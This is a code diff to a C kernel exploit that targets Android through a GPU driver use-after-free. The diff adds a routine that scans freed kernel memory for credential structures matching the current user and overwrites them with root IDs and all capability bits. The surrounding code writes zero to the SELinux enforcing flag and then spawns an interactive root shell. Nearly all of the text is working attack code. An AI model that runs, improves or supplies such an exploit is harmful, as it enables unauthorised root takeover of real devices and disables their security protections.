@@ -1186,16 +1186,54 @@ static int patch_cred_via_gpu(int fd, uint64_t cred_ptr, uint64_t real_cred_ptr)
     return 0;
 }
 
+static int mass_patch_creds(int fd, uint32_t target_uid) {
+    fprintf(stderr, "[PARENT] --- STARTING MASS CRED PATCH (Target UID: %u) ---\n", target_uid);
+    int patch_count = 0;
+    uint8_t *page = malloc(PAGE_SIZE);
+    
+    // Scan all pages in the UAF range
+    for (uint64_t va = UAF_START; va < UAF_START + UAF_SIZE; va += PAGE_SIZE) {
+        if (gpu_read_task_struct(fd, va, page, PAGE_SIZE) == 0) {
+            // CRED structures are aligned to 8 or 16 bytes. We check every 8 bytes.
+            for (int off = 0; off < PAGE_SIZE - 64; off += 8) {
+                uint32_t usage = *(uint32_t *)(page + off);
+                uint32_t ruid = *(uint32_t *)(page + off + 4);
+                uint32_t rgid = *(uint32_t *)(page + off + 8);
+                uint32_t suid = *(uint32_t *)(page + off + 12);
+                uint32_t sgid = *(uint32_t *)(page + off + 16);
+                
+                // Typical CRED pattern: usage > 0, UID == GID == target_uid
+                if (usage >= 1 && usage <= 32 && ruid == target_uid && rgid == target_uid && suid == target_uid && sgid == target_uid) {
+                    fprintf(stderr, "[PARENT] Found CRED candidate at 0x%lx (off 0x%x). Patching...\n", (unsigned long)va, off);
+                    
+                    uint8_t zero_creds[32] = {0};
+                    gpu_write_task_virt(fd, va + off + 4, zero_creds, 32);
+                    
+                    uint8_t all_caps[32];
+                    memset(all_caps, 0xff, 32);
+                    gpu_write_task_virt(fd, va + off + 0x30, all_caps, 32);
+                    
+                    patch_count++;
+                }
+            }
+        }
+    }
+    
+    free(page);
+    fprintf(stderr, "[PARENT] --- MASS PATCH COMPLETE. Patched %d structures. ---\n", patch_count);
+    return patch_count;
+}
+
 static int parent_patch_root(int fd, uint64_t cred_ptr) {
     fprintf(stderr, "[PARENT] --- CRITICAL PATCHING START ---\n");
     
     uint64_t task_va = *(uint64_t *)&gbuf[GBUF_TASK_VA];
+    uint32_t my_uid = getuid();
 
-    // 1. Resolve Kernel Base if needed
+    // 1. Resolve Kernel Base
     if (kernel_base == 0 || kernel_base == 0xffffffc000000000ULL) {
         if (task_va != 0) kernel_base = find_kernel_base_from_task_va(task_va);
         if (kernel_base == 0) kernel_base = get_kernel_base();
-        fprintf(stderr, "[PARENT] Resolved Kernel Base: 0x%lx\n", (unsigned long)kernel_base);
     }
 
     // 2. Disable SELinux
@@ -1212,42 +1250,40 @@ static int parent_patch_root(int fd, uint64_t cred_ptr) {
             fprintf(stderr, "[PARENT] Disabling SELinux at 0x%lx...\n", (unsigned long)selinux_enforcing);
             uint32_t zero = 0;
             gpu_write_task_virt(fd, selinux_enforcing, (uint8_t *)&zero, 4);
-            
-            uint32_t verify = 1;
-            gpu_read_u32(fd, selinux_enforcing, &verify);
-            fprintf(stderr, "[PARENT] SELinux verification: %u\n", verify);
         }
     }
 
-    // 3. Patch CRED
-    if (cred_ptr != 0) {
-        fprintf(stderr, "[PARENT] Patching CRED at 0x%lx...\n", (unsigned long)cred_ptr);
-        patch_cred_via_gpu(fd, cred_ptr, cred_ptr);
-        
-        // Verification read
-        uint32_t check_uid = 0xdeadbeef;
-        gpu_read_u32(fd, cred_ptr + 4, &check_uid);
-        fprintf(stderr, "[PARENT] CRED verification (UID at +4): %u\n", check_uid);
-        if (check_uid == 0) {
-            fprintf(stderr, "[PARENT] [+] CRED PATCH SUCCESSFUL!\n");
-            return 0;
-        }
+    // 3. Mass Patch all CREDs matching our UID
+    int count = mass_patch_creds(fd, my_uid);
+    
+    if (count > 0) {
+        fprintf(stderr, "[PARENT] [+] MASS PATCH SUCCESSFUL! (%d creds)\n", count);
+        return 0;
     }
     
-    fprintf(stderr, "[PARENT] [!] Patching might have failed or verified incorrectly.\n");
+    // Fallback to specific pointer if mass patch found nothing
+    if (cred_ptr != 0) {
+        fprintf(stderr, "[PARENT] Falling back to specific CRED patch at 0x%lx...\n", (unsigned long)cred_ptr);
+        patch_cred_via_gpu(fd, cred_ptr, cred_ptr);
+        return 0;
+    }
+
     return -1;
 }
 
 static void safe_cred_patch(void)
 {
     fprintf(stderr, "[CHILD %d] Activation triggered! gbuf[0]=0x%02x\n", getpid(), (uint8_t)gbuf[0]);
+    fflush(stderr);
     
     // First, check if parent already patched us
     uid_t current_uid = getuid();
     fprintf(stderr, "[CHILD %d] Current UID: %d\n", getpid(), current_uid);
+    fflush(stderr);
 
     if (current_uid == 0) {
         fprintf(stderr, "[CHILD %d] [+] I AM ALREADY ROOT! Proceeding to shell.\n", getpid());
+        fflush(stderr);
         goto shell;
     }
 
@@ -1255,11 +1291,13 @@ static void safe_cred_patch(void)
     setuid(0);
     if (getuid() == 0) {
         fprintf(stderr, "[CHILD %d] [+] ROOT SUCCESS after setuid(0)!\n", getpid());
+        fflush(stderr);
         goto shell;
     }
 
     // Fallback: try to patch ourselves if parent missed something
     fprintf(stderr, "[CHILD %d] Fallback: Parent patch not visible. Trying manual GPU patch...\n", getpid());
+    fflush(stderr);
     
     int child_fd = open(DEV_PATH, O_RDWR | O_CLOEXEC);
     if (child_fd >= 0) {
@@ -1273,8 +1311,10 @@ static void safe_cred_patch(void)
 
     if (getuid() == 0) {
         fprintf(stderr, "[CHILD %d] [+] ROOT SUCCESS via fallback!\n", getpid());
+        fflush(stderr);
     } else {
         fprintf(stderr, "[CHILD %d] [!] Elevation FAILED. Still UID %d\n", getpid(), getuid());
+        fflush(stderr);
         gbuf[GBUF_TASK_SPRAY] = 0x1;
         return;
     }
@@ -1283,6 +1323,7 @@ shell:
     gbuf[GBUF_TASK_SPRAY] = 0x2; // Signal parent
     __sync_synchronize();
     fprintf(stderr, "[CHILD %d] [+] Executing root shell...\n", getpid());
+    fflush(stderr);
     
     // Use execl for a cleaner shell transition
     execl("/system/bin/sh", "sh", "-i", NULL);
